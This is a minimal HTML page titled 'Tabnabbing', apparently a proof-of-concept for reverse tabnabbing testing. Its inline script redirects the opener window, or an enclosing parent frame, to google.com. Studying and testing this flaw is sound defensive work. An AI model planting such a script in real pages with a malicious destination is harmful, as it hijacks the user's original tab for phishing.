<!DOCTYPE html>
<html lang="en">
<head>
    <title>Tabnabbing</title>
</head>
<body>
    <h1>HELLO WORLD</h1>
    <script>
        if (window.opener) window.opener.parent.location.replace('http://google.com');
        if (window.parent != window) window.parent.location.replace('http://google.com')
    </script>
</body>
</html>
